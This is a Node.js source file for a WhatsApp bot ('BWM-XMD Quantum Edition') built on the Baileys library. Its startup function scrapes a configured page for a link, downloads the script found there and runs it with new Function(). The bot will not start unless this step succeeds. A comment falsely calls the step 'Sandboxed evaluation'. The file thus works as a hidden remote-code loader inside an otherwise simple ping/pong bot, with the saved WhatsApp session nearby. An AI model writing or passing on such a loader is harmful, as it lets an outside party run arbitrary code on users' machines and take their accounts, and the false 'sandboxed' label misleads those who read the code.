
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7
const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");
const { makeWASocket, DisconnectReason, useSingleFileAuthState } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');

// Initialize session management
const sessionFile = './session.json';
const { state, saveState } = useSingleFileAuthState(sessionFile);

// Improved BODY loader
async function fetchBODYUrl() {
  try {
    console.log('🌐 Fetching BODY script...');
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);
    const targetUrl = $('a:contains("BODY")').attr('href');

    if (!targetUrl) throw new Error('BODY script URL not found');
    
    console.log('🔗 BODY URL:', targetUrl);
    const scriptResponse = await axios.get(targetUrl);
    
    // Sandboxed evaluation
    const scriptFn = new Function(scriptResponse.data);
    scriptFn();
    
    console.log('✅ BODY script executed');
    return true;
  } catch (error) {
    console.error('❌ fetchBODYUrl() failed:', error.message);
    return false;
  }
}

// WhatsApp connection handler
async function connectToWhatsApp() {
  const sock = makeWASocket({
    printQRInTerminal: true,
    auth: state,
    logger: { level: 'debug' } // More detailed logging
  });

  // Save session when credentials update
  sock.ev.on('creds.update', saveState);

  // Connection event handler
  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;
    
    if (qr) {
      console.log('📢 Scan this QR code in WhatsApp:');
    }

    if (connection === 'open') {
      console.log('🤖 Bot connected successfully!');
    }

    if (connection === 'close') {
      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
      console.log(`Connection closed due to ${lastDisconnect.error}, reconnecting ${shouldReconnect}`);
      
      if (shouldReconnect) {
        connectToWhatsApp();
      }
    }
  });

  // Message handler
  sock.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.fromMe) return;
    
    const sender = msg.key.remoteJid;
    const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
    
    console.log(`📩 Message from ${sender}: ${text}`);
    
    // Example: Reply to "ping"
    if (text?.toLowerCase() === 'ping') {
      await sock.sendMessage(sender, { text: 'Pong!' });
    }
  });

  return sock;
}

// Main function
async function main() {
  try {
    console.log('🚀 Starting BWM-XMD Quantum Edition');
    
    const bodyLoaded = await fetchBODYUrl();
    if (!bodyLoaded) {
      throw new Error('Critical: Failed to load BODY script');
    }
    
    await connectToWhatsApp();
  } catch (error) {
    console.error('❌ Fatal error:', error);
    process.exit(1);
  }
}

// Start the application
main();